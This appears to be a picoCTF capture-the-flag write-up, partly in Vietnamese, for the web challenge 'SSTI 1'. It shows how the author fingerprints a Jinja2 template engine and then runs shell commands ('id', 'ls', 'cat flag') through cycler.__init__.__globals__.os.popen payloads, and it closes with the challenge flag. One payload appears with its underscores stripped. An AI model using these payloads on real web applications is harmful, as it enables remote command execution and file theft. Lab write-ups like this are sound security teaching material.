# challenge WEB 3 : SSTI 1.
![image](https://github.com/user-attachments/assets/2b9435bc-2af4-4c0c-8e90-161735b47a47)

sure this is an SSTI (Server Side Template Injection) vulnerability, some useful information and payload https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=SSTI#ssti-in-go

I tried some basic SSTI payload and checked which Template Injection Engine it belongs to: {{7*'7'}} it returns:
![image](https://github.com/user-attachments/assets/8ac22d91-ef30-46d0-8470-8fe346a592a5)

it belongs to template engine: jinja 2 as in the hacktricks page i have linked above, after knowing it is jinja 2 i tried the payloads below until this payload it worked properly:{{ cycler.init.globals.os.popen('id').read() }}:
![image](https://github.com/user-attachments/assets/de708928-0bf1-4b2d-9bdf-8e44a5cc1cbf)

hãy thử thêm vài câu lệnh khác {{ cycler.__init__.__globals__.os.popen('ls').read() }} và tôi thấy có flag trong thư mục hiện tại, tiếp tục tới payload này và chúng ta có cờ: {{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
![image](https://github.com/user-attachments/assets/9358bdbe-da19-40d9-8bcf-f3eed2406f28)

![image](https://github.com/user-attachments/assets/8d52f17d-a6a8-4231-a8a7-e88d49a92e65)

Here are each standard command, if you copy mine and get an error, please re-enter it manually:
![image](https://github.com/user-attachments/assets/d13e6a2e-d458-43d7-a7bc-d35e4711b2ed)

Problem solved: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_eb0c6390}
